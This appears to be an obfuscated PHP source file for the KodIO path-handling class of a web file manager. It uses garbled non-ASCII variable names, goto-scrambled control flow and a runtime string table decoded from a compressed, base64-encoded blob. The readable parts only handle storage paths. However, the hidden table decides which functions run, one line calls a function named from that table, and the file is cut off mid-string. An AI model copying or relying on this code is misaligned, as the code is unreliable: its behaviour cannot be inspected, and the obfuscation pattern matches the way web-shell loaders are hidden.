$_SERVER[ÒÆ›ÆØÎ¾][575]) { $e²–ÒÀ© = $_SERVER[ÒÆ›ÆØÎ¾][789]; $e²–ÒÀ©(); } $Béñ‘–Ñà = $_SERVER[ÒÆ›ÆØÎ¾][790]; goto AÂŒÎ† ÁÃ; E‡ŠÇå¥Ì¨: $dŠ‚ÔíØ¼µ = $_SERVER[ÒÆ›ÆØÎ¾][786]; $F²ò†ÃôÑÆ = $_SERVER[$_SERVER[ÒÆ›ÆØÎ¾][787]] . $_SERVER[ÒÆ›ÆØÎ¾][788]; $AÃ§Ã‰è¦ = $dŠ‚ÔíØ¼µ($F²ò†ÃôÑÆ); goto E¾¦ÈÎ£Ü; D·ğ‡êÓˆ: } class KodIO { const KOD_SOURCE = "\x7b\163\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\x52\x65\143\x79\143\154\145\175"; const KOD_USER_FAV = "\173\x75\163\x65\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\x75\163\145\x72\106\151\154\145\x54\141\x67\175"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\106\x69\x6c\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\157\x75\160\x52\157\157\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\165\163\145\x72\123\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\x68\141\x72\145\114\151\x6e\x6b\175"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\x65\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\173\x73\150\141\x72\x65\111\164\x65\155\175"; const KOD_SHARE_LINK = "\x7b\163\x68\x61\x72\145\111\164\x65\x6d\114\x69\156\x6b\x7d"; const KOD_SEARCH = "\173\163\145\x61\x72\x63\150\175"; const KOD_BLOCK = "\173\x62\x6c\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\x69\157\175"; const KOD_USER_RECENT = "\x7b\165\163\145\162\x52\145\156\x63\145\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\x69\166\x65\162\x7d"; public static function typeList() { $B— ÷ğÈ‚± =& $_SERVER[ÒÆ›ÆØÎ¾]; return array($B— ÷ğÈ‚±[1130] => self::KOD_SOURCE, $B— ÷ğÈ‚±[1131] => self::KOD_USER_RECYCLE, $B— ÷ğÈ‚±[1132] => self::KOD_USER_FAV, $B— ÷ğÈ‚±[1133] => self::KOD_USER_FILE_TAG, $B— ÷ğÈ‚±[1134] => self::KOD_USER_FILE_TYPE, $B— ÷ğÈ‚±[1135] => self::KOD_GROUP_ROOT_SELF, $B— ÷ğÈ‚±[1136] => self::KOD_USER_SHARE, $B— ÷ğÈ‚±[1137] => self::KOD_USER_SHARE_LINK, $B— ÷ğÈ‚±[1138] => self::KOD_USER_SHARE_TO_ME, $B— ÷ğÈ‚±[1139] => self::KOD_SHARE_ITEM, $B— ÷ğÈ‚±[1140] => self::KOD_SHARE_LINK, $B— ÷ğÈ‚±[1141] => self::KOD_SEARCH, $B— ÷ğÈ‚±[1142] => self::KOD_BLOCK, $B— ÷ğÈ‚±[1143] => self::KOD_IO, $B— ÷ğÈ‚±[1144] => self::KOD_USER_RECENT, $B— ÷ğÈ‚±[1145] => self::KOD_USER_DRIVER); } public static function parse($dİóñéŸŞ) { goto CÒÚØÊğó³; CÒÚØÊğó³: $C†óÉå·Šß =& $_SERVER[ÒÆ›ÆØÎ¾]; $dİóñéŸŞ = self::clear($dİóñéŸŞ); $f§Á„‹„é = array_values(self::typeList()); goto Cªî ‡„Ñ; cíÙèê®—Å: $AÒÖ†²·²‡ = array($C†óÉå·Šß[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $AÖœ„’© ö[$C†óÉå·Šß[1111]] = in_array($AÖœ„’© ö[$C†óÉå·Šß[29]], $AÒÖ†²·²‡); return $AÖœ„’© ö; goto FíĞ« “×; Cªî ‡„Ñ: preg_match($C†óÉå·Šß[1146], $dİóñéŸŞ, $c¨æğèô‰É); $AÖœ„’© ö = array($C†óÉå·Šß[415] => !1, $C†óÉå·Šß[1147] => !1, $C†óÉå·Šß[412] => !1, $C†óÉå·Šß[76] => $dİóñéŸŞ, $C†óÉå·Šß[1056] => !1, $C†óÉå·Šß[1055] => $C†óÉå·Šß[33]); if (is_array($c¨æğèô‰É) && count($c¨æğèô‰É) == 5) { $e—ÏÃÕÚ“² = $C†óÉå·Šß[1148] . $c¨æğèô‰É[2] . $C†óÉå·Šß[325]; if (in_array($e—ÏÃÕÚ“², $f§Á„‹„é)) { $AÖœ„’© ö[$C†óÉå·Šß[1056]] = $c¨æğèô‰É[1]; $AÖœ„’© ö[$C†óÉå·Šß[29]] = $e—ÏÃÕÚ“²; $AÖœ„’© ö[$C†óÉå·Šß[1149]] = substr($e—ÏÃÕÚ“², 1, -1); $AÖœ„’© ö[$C†óÉå·Šß[393]] = $c¨æğèô‰É[3]; } $AÖœ„’© ö[$C†óÉå·Šß[1055]] = $c¨æğèô‰É[4]; } goto cíÙèê®—Å; FíĞ« “×: } public static function isTruePath($C°¦­Õë¢Ò) { goto E»’õøºŒÙ; E»’õøºŒÙ: $c¦Ä¸¢”ƒæ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (substr($C°¦­Õë¢Ò, 0, 1) != $c¦Ä¸¢”ƒæ[1148]) { return !0; } if (strpos($C°¦­Õë¢Ò, $c¦Ä¸¢”ƒæ[401]) === 0) { return !0; } goto EòäˆğËÁğ; EòäˆğËÁğ: if (strpos($C°¦­Õë¢Ò, $c¦Ä¸¢”ƒæ[1114]) === 0) { return !0; } if (strpos($C°¦­Õë¢Ò, $c¦Ä¸¢”ƒæ[1150]) === 0) { return !0; } if (strpos($C°¦­Õë¢Ò, $c¦Ä¸¢”ƒæ[1151]) === 0) { return !0; } goto a”Ñ÷éŒŒ; a”Ñ÷éŒŒ: if (strpos($C°¦­Õë¢Ò, $c¦Ä¸¢”ƒæ[1152]) === 0) { return !0; } return !1; goto c‚•íÚ­¡; c‚•íÚ­¡: } public static function clear($BÔ‘Î¨¡ä) { goto bù¾‚‹¿¿; bù¾‚‹¿¿: $DÜŠ‰è‰ìÆ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÔ‘Î¨¡ä = str_replace(array($DÜŠ‰è‰ìÆ[1029], $DÜŠ‰è‰ìÆ[229]), $DÜŠ‰è‰ìÆ[50], $BÔ‘Î¨¡ä); $BÔ‘Î¨¡ä = str_replace($DÜŠ‰è‰ìÆ[97], $DÜŠ‰è‰ìÆ[8], $BÔ‘Î¨¡ä); goto bÍ ë¯Å¿á; cÖõèä£Éö: $BÔ‘Î¨¡ä = preg_replace($DÜŠ‰è‰ìÆ[1155], $DÜŠ‰è‰ìÆ[8], $BÔ‘Î¨¡ä); if ($BÔ‘Î¨¡ä == $DÜŠ‰è‰ìÆ[8]) { return $DÜŠ‰è‰ìÆ[8]; } $BÔ‘Î¨¡ä = rtrim($BÔ‘Î¨¡ä, $DÜŠ‰è‰ìÆ[8]); goto e·¥º¦‚®; bÍ ë¯Å¿á: $F¨öä¹óØ× = $DÜŠ‰è‰ìÆ[1153]; if (substr($BÔ‘Î¨¡ä, 0, 3) == $DÜŠ‰è‰ìÆ[1154]) { $BÔ‘Î¨¡ä = substr($BÔ‘Î¨¡ä, 3); } while (strstr($BÔ‘Î¨¡ä, $F¨öä¹óØ×)) { $BÔ‘Î¨¡ä = str_replace($F¨öä¹óØ×, $DÜŠ‰è‰ìÆ[8], $BÔ‘Î¨¡ä); } goto cÖõèä£Éö; e·¥º¦‚®: return $BÔ‘Î¨¡ä; goto aŒĞã½ª‘; aŒĞã½ª‘: } public static function sourceID($dĞ‘„ÕÇÎ) { $C¾Â…×¾Ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $a¸ë‡°Ãƒä = self::parse($dĞ‘„ÕÇÎ); if ($a¸ë‡°Ãƒä[$C¾Â…×¾Ä[29]] !== self::KOD_SOURCE) { show_json(LNG($C¾Â…×¾Ä[1156]), !1); } return $a¸ë‡°Ãƒä[$C¾Â…×¾Ä[393]]; } public static function make($aÛÜŸìÏğ³) { if (!$aÛÜŸìÏğ³) { return !1; } return self::makePath(self::KOD_SOURCE, intval($aÛÜŸìÏğ³)); } public static function makeShare($d¡ô°æÑÍÊ, $fÌ´„Ø”Ç˜) { return self::makePath(self::KOD_SHARE_ITEM, $d¡ô°æÑÍÊ, $fÌ´„Ø”Ç˜); } public static function makeFileTypePath($FÂß‡ÊÌÁ‡) { return self::makePath(self::KOD_USER_FILE_TYPE, $FÂß‡ÊÌÁ‡); } public static function makeFileTagPath($D·è¹‰‚Ã) { return self::makePath(self::KOD_USER_FILE_TAG, $D·è¹‰‚Ã); } public static function makePath($DŒ¬¥‹éãä, $aË…÷Ã½è = '', $cÚ„…¯Ô•— = '') { $CºÈİøÅ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÛ‚ª¬£…ß = substr($DŒ¬¥‹éãä, 1, -1); $b·½ÊĞóÙ = $CºÈİøÅ[1157] . $fÛ‚ª¬£…ß . $CºÈİøÅ[1158] . $aË…÷Ã½è . $CºÈİøÅ[1159]; $b·½ÊĞóÙ = $cÚ„…¯Ô•— ? $b·½ÊĞóÙ . $cÚ„…¯Ô•— . $CºÈİøÅ[8] : $b·½ÊĞóÙ; return $b·½ÊĞóÙ; } public static function hashPath($dÇ•’šª×³, $AÉŸêÆ“âÉ = true) { goto b˜ÆÂ ¢îÚ; C¦Ë±ÚÖ¾: return $dÕ¹åˆ¼…Å; goto aÔ¸Ä¢©õƒ; b˜ÆÂ ¢îÚ: $B¤¦‚ç˜…ø =& $_SERVER[ÒÆ›ÆØÎ¾]; $A›¥…³¥Ú¬ = is_array($dÇ•’šª×³) ? $dÇ•’šª×³ : IO::info($dÇ•’šª×³); $dÕ¹åˆ¼…Å = _get($A›¥…³¥Ú¬, $B¤¦‚ç˜…ø[1160], $B¤¦‚ç˜…ø[33]); goto B½©Øˆˆé¼; B½©Øˆˆé¼: if (!$dÕ¹åˆ¼…Å && isset($A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[395]])) { $A›¥…³¥Ú¬ = IO::info(KodIO::make($A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[395]])); $dÕ¹åˆ¼…Å = _get($A›¥…³¥Ú¬, $B¤¦‚ç˜…ø[1160], $B¤¦‚ç˜…ø[33]); } if (!$dÕ¹åˆ¼…Å && $AÉŸêÆ“âÉ) { $DØöÆêõ·‘ = KodIO::parse($A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[76]]); if (!$DØöÆêõ·‘[$B¤¦‚ç˜…ø[29]]) { $dÕ¹åˆ¼…Å = IO::hashSimple($A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[76]]); } } if (!$dÕ¹åˆ¼…Å) { $dÕ¹åˆ¼…Å = md5($A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[76]] . $A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[78]] . $A›¥…³¥Ú¬[$B¤¦‚ç˜…ø[84]]); } goto C¦Ë±ÚÖ¾; aÔ¸Ä¢©õƒ: } public static function initSystemPath() { goto E¾Êãğ®Ñ½; E¾Êãğ®Ñ½: $F‚í®á™Õî =& $_SERVER[ÒÆ›ÆØÎ¾]; if (defined($F‚í®á™Õî[1161])) { return; } define($F‚í®á™Õî[1161], self::systemPath($F‚í®á™Õî[1162])); goto a¡æØŸ÷ŠŒ; a¡æØŸ÷ŠŒ: define($F‚í®á™Õî[1163], self::systemPath($F‚í®á™Õî[1164])); define($F‚í®á™Õî[1165], self::systemPath($F‚í®á™Õî[1166])); define($F‚í®á™Õî[1167], self::systemPath($F‚í®á™Õî[1168])); goto AÑğƒÆ·°Ï; AÑğƒÆ·°Ï: IOHistory::bindEvent(); goto fÄ¨Ú¹ÃÙ‹; fÄ¨Ú¹ÃÙ‹: } public static function systemPath($dÃ’íªâ§‚) { goto aÚŠº·óß·; E¿¤”§µš›: if ($EÎïƒ„çğ¦) { return $EÎïƒ„çğ¦; } if ($dÃ’íªâ§‚ == $cğ¯Íóùµ[1162]) { $EÎïƒ„çğ¦ = self::make(Model($cğ¯Íóùµ[782])->systemRootPathAdd($cğ¯Íóùµ[505])); } else { $EÎïƒ„çğ¦ = self::systemPath($cğ¯Íóùµ[1162]); $d‘ÄŠ¯»×Ì = self::sourceID($EÎïƒ„çğ¦); $EÎïƒ„çğ¦ = self::make(Model($cğ¯Íóùµ[782])->mkdir($d‘ÄŠ¯»×Ì, $dÃ’íªâ§‚)); } Model($cğ¯Íóùµ[722])->set($dßğ²¤ŞØ, $EÎïƒ„çğ¦); goto båã‡„; aÚŠº·óß·: $cğ¯Íóùµ =& $_SERVER[ÒÆ›ÆØÎ¾]; $dßğ²¤ŞØ = $cğ¯Íóùµ[1169] . ucfirst($dÃ’íªâ§‚); $EÎïƒ„çğ¦ = Model($cğ¯Íóùµ[722])->get($dßğ²¤ŞØ); goto E¿¤”§µš›; båã‡„: return $EÎïƒ„çğ¦; goto A­‰Æ¼æ’ë; A­‰Æ¼æ’ë: } public static function systemFolder($E‡éîÁÚÍ‡) { $Bİšò™®ç = IO_PATH_SYSTEM_SOURCE . $E‡éîÁÚÍ‡; $d±Ã“Œ¨Ç = Cache::get($Bİšò™®ç); if (!$d±Ã“Œ¨Ç) { $cÂ¢ä¥Øè“ = IO::infoFull($Bİšò™®ç); if (!$cÂ¢ä¥Øè“) { $d±Ã“Œ¨Ç = IO::mkdir($Bİšò™®ç, REPEAT_SKIP); } else { $d±Ã“Œ¨Ç = $cÂ¢ä¥Øè“[$_SERVER[ÒÆ›ÆØÎ¾][76]]; } Cache::set($Bİšò™®ç, $d±Ã“Œ¨Ç, 3600 * 10); } return $d±Ã“Œ¨Ç; } public static function defaultDriver() { return Model($_SERVER[ÒÆ›ÆØÎ¾][719])->defaultDriver(); } public static function defaultIO() { $D«Ò‹ôÈ¦˜ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c˜¬˜Ô§À = self::defaultDriver(); return $D«Ò‹ôÈ¦˜[1170] . $c˜¬˜Ô§À[$D«Ò‹ôÈ¦˜[393]] . $D«Ò‹ôÈ¦˜[1159]; } public static function defaultDriverInit() { static $cº¶ö³…”† = false; if ($cº¶ö³…”†) { return $cº¶ö³…”†; } $cº¶ö³…”† = IO::init(self::defaultIO()); return $cº¶ö³…”†; } public static function fileTypeList() { $C‹ƒ§à‰É =& $_SERVER[ÒÆ›ÆØÎ¾]; $cï¾Ä‡Øºƒ = $GLOBALS[$C‹ƒ§à‰É[6]][$C‹ƒ§à‰É[1171]]; foreach ($cï¾Ä‡Øºƒ as $fº¸˜¼À› => $f©¦ÉÅ´Û¨) { $Bµ³«¸§š¸ = $C‹ƒ§à‰É[1172] . $fº¸˜¼À›; $FíÒÍÇ³‚Ï = LNG($Bµ³«¸§š¸); if ($Bµ³«¸§š¸ != $FíÒÍÇ³‚Ï) { $cï¾Ä‡Øºƒ[$fº¸˜¼À›][$C‹ƒ§à‰É[28]] = $FíÒÍÇ³‚Ï; } } return $cï¾Ä‡Øºƒ; } public static function transferType($B‚ë·®™‡, $BÇÛÉõÄÏ) { goto cÆ´œñ‘•; cÆ´œñ‘•: $e›·“ãÂğ· =& $_SERVER[ÒÆ›ÆØÎ¾]; $Cø¨£Ê¨òî = self::driverType($B‚ë·®™‡); $dÔ—šßĞ• = self::driverType($BÇÛÉõÄÏ); goto d ‚‚‚ë§˜; d ‚‚‚ë§˜: if ($Cø¨£Ê¨òî[$e›·“ãÂğ·[29]] == $dÔ—šßĞ•[$e›·“ãÂğ·[29]] && $Cø¨£Ê¨òî[$e›·“ãÂğ·[1173]] == $dÔ—šßĞ•[$e›·“ãÂğ·[1173]]) { return $e›·“ãÂğ·[1174]; } if ($Cø¨£Ê¨òî[$e›·“ãÂğ·[29]] == $e›·“ãÂğ·[822] && $dÔ—šßĞ•[$e›·“ãÂğ·[29]] == $e›·“ãÂğ·[106]) { return $e›·“ãÂğ·[1085]; } if ($Cø¨£Ê¨òî[$e›·“ãÂğ·[29]] == $e›·“ãÂğ·[106] && $dÔ—šßĞ•[$e›·“ãÂğ·[29]] == $e›·“ãÂğ·[822]) { return $e›·“ãÂğ·[107]; } goto FŸ›«½çª¥; FŸ›«½çª¥: return $e›·“ãÂğ·[1175]; goto BãÖ–ÅËÓ´; BãÖ–ÅËÓ´: } public static function driverType($d·Àó“Ô•Œ) { goto AšÙ×ƒî½; E„ÕÇÕ½¼—: return array($C—ì§‘†¿‡[29] => $C—ì§‘†¿‡[822], $C—ì§‘†¿‡[1173] => $d·Àó“Ô•Œ->pathDriver, $C—ì§‘†¿‡[76] => $EåæÚÆ‘»­); goto dì­£”ªµ™; BğÏëóœ…: if ($E²Á‚ÅØŞ == $C—ì§‘†¿‡[710] || $E²Á‚ÅØŞ == $C—ì§‘†¿‡[1177] || $E²Á‚ÅØŞ == $C—ì§‘†¿‡[1178]) { $d·Àó“Ô•Œ = self::defaultDriverInit(); } else { if ($E²Á‚ÅØŞ == $C—ì§‘†¿‡[1092] || $E²Á‚ÅØŞ == $C—ì§‘†¿‡[1179]) { $d·Àó“Ô•Œ = IO::init($d·Àó“Ô•Œ->pathParse[$C—ì§‘†¿‡[1039]]); } } $E²Á‚ÅØŞ = str_replace($C—ì§‘†¿‡[1176], $C—ì§‘†¿‡[33], strtolower($d·Àó“Ô•Œ->getType())); if ($E²Á‚ÅØŞ == $C—ì§‘†¿‡[106]) { return array($C—ì§‘†¿‡[29] => $C—ì§‘†¿‡[106], $C—ì§‘†¿‡[1173] => $C—ì§‘†¿‡[33], $C—ì§‘†¿‡[76] => $EåæÚÆ‘»­); } goto E„ÕÇÕ½¼—; AšÙ×ƒî½: $C—ì§‘†¿‡ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EåæÚÆ‘»­ = $d·Àó“Ô•Œ->path; $E²Á‚ÅØŞ = str_replace($C—ì§‘†¿‡[1176], $C—ì§‘†¿‡[33], strtolower($d·Àó“Ô•Œ->getType())); goto BğÏëóœ…; dì­£”ªµ™: } } goto dÊ‡¹Î½¡‚; cŒ¸¬„áÁ: if (!function_exists('_kodDe')) { function _kodDe($BĞ‚½ˆğ“…) { $BĞ‚½ˆğ“… = base64_decode($BĞ‚½ˆğ“…); $b“Àï¥êèÊ = strlen($BĞ‚½ˆğ“…); $dÔ¿ÍÔˆ  = ''; $aéé…”†è = ord($BĞ‚½ˆğ“…[0]) - 30; for ($F«©ÖùÇÈæ = 1; $F«©ÖùÇÈæ < $b“Àï¥êèÊ; $F«©ÖùÇÈæ += 2) { if ($F«©ÖùÇÈæ + 1 < $b“Àï¥êèÊ) { $dÔ¿ÍÔˆ  .= chr(ord($BĞ‚½ˆğ“…[$F«©ÖùÇÈæ + 1]) + $aéé…”†è); $dÔ¿ÍÔˆ  .= chr(ord($BĞ‚½ˆğ“…[$F«©ÖùÇÈæ]) + $aéé…”†è); } else { $dÔ¿ÍÔˆ  .= chr(ord($BĞ‚½ˆğ“…[$F«©ÖùÇÈæ]) + $aéé…”†è); } } return $dÔ¿ÍÔˆ ; } } define("\xd2\xc6\x9b\xc6\xd8\xce\xbe", strrev('¸ ‘Ñ‚ë«')); $_SERVER[ÒÆ›ÆØÎ¾] = explode("\174\4\174\2\174\4", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\xad\x7d\x9\x7c\x1b\xc5\xf5\x30\x94\x33\x5c\xe1\x4a\x29\xe5\xc8\xc6\x24\xf1\xa5\xc3\x71\x6e\x27\x8e\x91\x2d\xd9\x56\x22\x4b\x46\x92\xe3\x84\x38"."\121\126\322\312\132\133\322\312\273\53\137\111\270\357\220\4\10\107\113\370\267\320\160\205\43\100\150\271\103\241\55\147\270\102\271\102\111\241\205\70\15\147\303\175\24\370"."\346\236\331\225\114\377\337\357\373\40\211\166\356\231\67\157\336\274\367\346\315\233\115\117\335\162\315\312\375\127\376\154\345\376\257\337\174\333\123\370\153\345\176\53\17\130"."\x79\x20\xfe\x1e\xbf\xfa\xe0\x7d\xd0\x7f\xfb\xad\xbe\xa4\xa2\xa2\x75\xc6\x21\xd5\xc1\xc3\xd6\xfd\xfe\x4e\x79\xb3\x7c\xa7\xbc\x3a\x14\xd8\xf6\x9c\xff\xf0\x17\xee\x98\xef\x1b\xd9\xb8\x6d"."\x68\x64\xdf\x7d\xce\xfe\x61\xfc\xf6\x3a\x90\x19\x97\xad\xc3\x3f\x52\x4e\x33\x25\x65\x50\x35\x4c\x3\x47\x24\xb4\x5c\x4a\xed\xc6\xdf\x6a\xe\xff\xba\xf1\x8f\xd1\x97\x51\x4d\x5\x7f\xc7"."\x82\xa1\x68\x2c\xd2\xd1\xde\xee\xb\x47\x63\xa4\x46\x31\x3d\xab\x25\xc9\x57\x5e\xd6\xe5\x2c\xa9\x3c\xaf\xe8\x6\x68\x4a\xac\x2e\x96\xd7\xf2\x4a\xce\x12\xc3\x23\x92\xb2\x29\xc7\x65\x83"."\324\344\155\214\171\175\355\201\320\342\130\164\161\273\217\344\210\307\372\12\212\76\204\103\350\63\142\312\272\31\125\263\12\313\61\240\263\176\65\372\132\374\101\51\32\366"."\x4\x23\x9e\xa6\xa8\x3f\x14\xc4\xd1\x4d\xa1\xb6\x36\x7f\xb4\x38\x3e\x1c\xa\x4\x1a\x3d\x4d\xb\x8a\x53\xda\xc3\x9e\x96\x36\x8f\x4\xfa\x97\x51\x62\x6a\x2e\xa5\x55\x48\xcb\x71\xca\x72"."\xa9\x12\x7f\x34\xab\x4a\x26\x89\x3f\x73\x32\xed\x8e\x39\x94\x27\x5f\x51\xf6\x5\xe6\x20\x57\xc8\x64\x70\x20\xc8\xbe\x48\xff\x95\x94\x5c\xc8\x10\x98\x79\xc5\x40\x5e\x57\xb3\x32\x1d\xfa".base64_decode('AmWIxeIPuWBqai6BA75BU5d5POhxQleySo5UFfEFfE1RCXZTag6H2iQyFVnZMA==')."\x15\x5d\xea\x6c\xf5\x85\x7d\x12\xec\x7a\x7d\x39\x1a\x71\xb9\x84\xcb\x75\x4\x1\x40\x24\x4f\x20\x20\x8d\x56\x83\xa9\x64\xf3\xb4\x1a\x5c\xa6\x44\x65\xa1\xb0\xd7\x17\x96\x1a\x17\x4b\x1c"."\x4e\x9\x2d\x9b\xd5\x72\x2e\x50\xb\x98\x4f\x53\xe8\xaa\x2f\x1c\xc6\x1f\xe\x82\xc1\x1\x3f\x9c\x3a\x12\x8\x35\x37\x47\x7c\x2c\x44\x6\x77\x5a\x0\xf4\x64\x2a\xc1\x52\x4b\x28\x99\xca"."\x98\xb1\x7e\x39\x53\xa0\xc8\xda\x8b\x7f\xcb\xc9\xf\xf9\xd5\xc\x82\xc0\x7d\x6a\x4e\x2d\x10\x64\x25\x55\x68\x1a\x5b\x39\xe4\xa3\x40\x73\x2b\x34\x46\x49\x92\x8f\x2c\x28\xaf\x91\xc5\x5".strrev('Ój–„®j#äu{LÙ@ÁÖ@Øõ‘ÍRZä¦3tSLñLç‡Ÿ¬ş?ZV')."\372\311\140\122\152\106\11\260\345\226\322\62\111\105\347\341\74\50\56\246\220\121\251\303\102\351\140\41\53\146\141\301\104\132\315\44\165\272\112\177\52\47\240\3\152\152".strrev('Y­”‘Š`¨` Í¬atQ94gÈêã ÚLRd…2zÎÛ/ÖÅ	è+CF¯ˆ').strrev('Pe12d­-t‹¯Ä$©ş'."\n".'œ—Kçlä±Wzt '."\n".'Izéz%¨µ`ûH7@^³Ó')."\41\353\52\233\234\156\320\261\272\215\270\232\163\203\30\34\364\207\142\151\331\110\267\45\247\307\120\51\112\123\223\312\240\53\237\316\223\245\317\126\173\227\5\357\341\354"."\x4\x35\xd3\x27\x50\xe6\x8c\x96\x90\x33\xe2\x48\xf1\x77\xda\x34\xf3\x11\x25\x97\x84\x0\x21\x23\xd2\x6\x72\x8\x60\x79\x45\x21\x99\xbc\xe\x29\x29\xb5\x49\x8b\xa5\xd6\x3a\xb5\xce\xa0".base64_decode('BbMZ9kVHx+IMFmkOEowpI2Fl0CRAkeYk0rIOpqu+YKacswh9yeczakI2VS3n1g==')."\x12\xa6\x62\x3a\xd\x53\x57\x64\x52\x9b\x27\x91\x50\xc\xc3\xd9\xa4\xe5\x4c\x5d\xcb\x38\x3d\x99\x8c\x36\xe0\xc\xe9\x6a\xb7\x9a\xab\x93\xaa\x8\x35\x6\x89\x60\xbd\x3b\x21\x85\xac\x23"._kodDe('LKp9gF5j9gT3HHoMzo5PqR7ZIIZ+LZRWb8bDUjsKMJZzrsuDnP7JaAdAoT+EQEU=')."\xa4\x21\x71\xe1\xd5\xd7\xff\x44\x7e\x35\x97\x51\x73\x4a\x51\x5e\xdf\x60\x5e\xd5\x15\x83\xf6\x55\x6a\x69\x8b\x92\x4a\x40\xed\x8a\xb3\x5d\x97\xbb\xb3\x72\x9d\x94\x2f\xc4\x1\x64\xc8\xea"."\55\21\207\163\23\320\324\111\11\30\164\110\331\202\141\72\165\5\120\51\25\354\207\144\216\375\51\147\33\134\132\252\222\164\106\0\61\47\321\123\153\246\111\0\155\44"."\x9a\x86\x63\x5b\xa3\xd1\xf6\x98\xbf\x19\xec\xd9\x41\x5f\xac\xcd\x13\x6d\x6a\x25\xdd\x36\xe5\x6e\xda\xe7\x0\x20\xd1\xac\x4a\x1a\xb9\xc8\x9\x96\x18\x44\xac\x20\x18\x2b\x8f\x6c\xd7\x6"."\x14\x1d\x34\xdc\x38\x54\x27\xf5\x6a\xc9\xb8\x36\xe8\xa2\x49\x30\x73\x4\xd0\x10\x9a\x19\x4e\x77\xde\x74\x86\xe5\x5c\x37\x84\x4f\x7c\xc8\x54\x8\xfa\x19\xfd\xdd\x56\x40\x7\x94\x5c\xb7"."\231\246\5\43\276\360\102\137\70\26\11\65\107\73\75\141\262\333\347\0\226\14\322\246\140\325\31\147\130\111\2\320\47\114\132\116\316\103\250\321\74\160\141\300\271\242"."\xa9\x70\xb1\xd0\xb4\x80\xbf\x5\x2\xc6\xeb\x34\x40\x26\xa7\x98\x8b\xd6\x1d\x50\xb3\x2a\xec\xbb\xc9\x52\x10\x24\x1\x2b\xd0\x42\x3a\xe4\x46\x3\xaa\xef\x4a\x57\x55\x74\x25\xab\x2b\x9d"."\xe0\xdf\xaa\xca\x25\x5d\x5e\x57\xd5\xd2\x6\xb7\xca\xcb\xb8\xa7\xb8\xa6\x48\xb5\x35\x33\xa4\x76\xc0\x9b\xa8\x72\x46\x22\x83\x2e\xca\x51\x23\x85\x16\xfc\x4\x0\xe0\xd6\x25\x2c\x6b\x1b".base64_decode('6HBk2Hdahy8SjbX5oq0hL2nB5yFfAQ0vTTqiJfhnqYvTYzDn/qzcbaPSMNSm6Q==').base64_decode('ijWG7xqdapKScRhsVdTuNBmfCmtLaBlNlzOQilEkVihl6VZTZH4wweSBiJrNUw==')."\272\146\246\13\331\270\360\111\331\122\60\337\164\173\111\153\154\173\323\164\362\125\347\46\31\47\325\66\123\312\354\216\114\5\177\70\31\116\152\131\231\162\273\210\44\51".base64_decode('SUyTcFSVJaVVkfl+aeqmBmN1S5Y2xUxrZJK6FdqlAusb7WVSySgUGmmFkvQakg==')."\15\354\114\14\126\51\106\336\1\343\6\142\371\226\252\32\141\120\22\62\122\64\334\11\371\135\36\141\262\254\31\260\233\204\342\75\140\271\20\116\102\65\232\205\315\77"."\xa6\xa1\x34\xd0\x79\x99\xe7\x6f\xd7\x95\x94\x4a\x16\x5d\xe\xcc\x58\x9b\xac\xf7\xd2\x2\x60\x86\xf8\xb6\x3\x3\x42\x65\xcd\x1d\x81\x40\xac\x29\x14\x8c\x2\x1e\x1a\xc7\x74\x86\xfd\x51"."\37\305\121\217\67\346\151\152\147\233\50\237\161\222\1\22\214\342\335\0\307\364\327\12\73\21\337\262\70\61\247\133\55\44\326\370\33\120\347\274\226\63\24\147\202\324"."\226\344\144\35\347\230\143\243\351\105\45\70\347\76\350\224\263\303\316\54\0\223\223\165\335\272\303\112\121\161\243\366\223\171\345\344\33\2\26\10\106\164\153\157\17\105"."\x48\x81\x6\x18\xb\xb8\xa7\xb8\xa2\x93\x7e\xb4\x77\x90\xa4\xac\x80\x53\x2d\x3e\x12\x79\x8\xdd\xad\x65\xc2\x3b\x79\x3a\x23\x94\xf4\x16\x40\x7e\x5d\x1d\x96\xf9\x18\x1b\x68\x7f\x48\xdd".base64_decode('g9kMZwito3LyuYi2+oMLYm0hry8Q8wcBXYoWx3e0ez10csX4xlC01RLbASjTQg==')."\117\300\157\317\356\133\344\217\104\43\45\223\100\134\207\317\226\2\144\301\366\260\257\331\277\210\5\233\375\276\200\67\22\153\362\64\265\362\74\101\117\33\11\304\122\120"."\32\63\334\326\374\61\100\142\43\114\246\213\365\103\371\224\2\53\146\21\240\142\124\64\210\161\74\0\333\245\102\160\217\14\27\112\305\150\44\204\107\117\150\5\212\215".base64_decode('jE3MUqqSlcmykulWWIF/KiVPRDLzMUY/4kPsEw2DhgFDSNqXCLkv6kEM5mlUUg==')."\214\162\227\216\360\244\114\106\5\154\141\260\56\170\32\230\1\17\22\277\1\46\240\31\211\321\265\146\0\171\305\103\273\223\342\242\157\54\324\356\13\173\240\340\34\353"."\xc\x87\x82\x2d\xa4\xc0\x40\x5a\xa1\x1d\xf0\x13\xf0\x57\x50\xf6\x89\xc8\xcf\x26\x27\x61\x80\xf7\x91\xa9\x8\xc5\x81\xde\xa3\x51\x50\xae\xc4\x3f\x93\xf1\xf\x60\xfb\x48\xe3\x4a\x8e\x42"."\75\16\251\71\43\14\124\46\2\253\201\122\142\